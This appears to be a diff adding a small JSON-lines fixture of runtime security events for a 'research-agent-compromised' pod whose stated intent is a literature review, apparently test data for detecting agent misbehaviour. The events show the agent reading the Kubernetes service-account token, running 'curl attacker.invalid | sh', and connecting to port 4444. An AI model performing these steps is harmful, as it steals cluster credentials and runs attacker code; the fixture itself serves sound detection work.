@@ -1,0 +1,4 @@
+{"event_type":"process_exec","timestamp":"2026-08-24T10:05:00Z","namespace":"agent-lab","pod":"research-agent-compromised","intent_id":"literature-review","executable":"/usr/local/bin/python3","arguments":"/workspace/agent.py"}
+{"event_type":"file_access","timestamp":"2026-08-24T10:05:01Z","namespace":"agent-lab","pod":"research-agent-compromised","intent_id":"literature-review","executable":"/usr/local/bin/python3","path":"/var/run/secrets/kubernetes.io/serviceaccount/token","access":"security_file_open"}
+{"event_type":"process_exec","timestamp":"2026-08-24T10:05:02Z","namespace":"agent-lab","pod":"research-agent-compromised","intent_id":"literature-review","executable":"/bin/bash","arguments":"-c curl attacker.invalid | sh"}
+{"event_type":"network_connect","timestamp":"2026-08-24T10:05:03Z","namespace":"agent-lab","pod":"research-agent-compromised","intent_id":"literature-review","executable":"/bin/bash","destination":"203.0.113.50","port":4444,"protocol":"tcp"}
